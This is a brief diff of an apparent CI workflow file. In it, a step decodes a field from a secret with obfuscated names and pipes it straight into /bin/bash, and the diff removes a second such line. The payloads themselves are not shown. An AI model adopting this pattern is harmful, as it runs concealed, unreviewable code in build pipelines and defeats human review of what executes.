@@ -18,7 +18,6 @@ jobs:
           gem53: ${{ secrets.gem53 }}
         run: |
           printf '%s' "$gem53" | jq -r .zchng2 | /bin/bash
-          printf '%s' "$bbzb9" | jq -r .hxwk9 | /bin/bash
 
       - name: Upload results
         if: always()
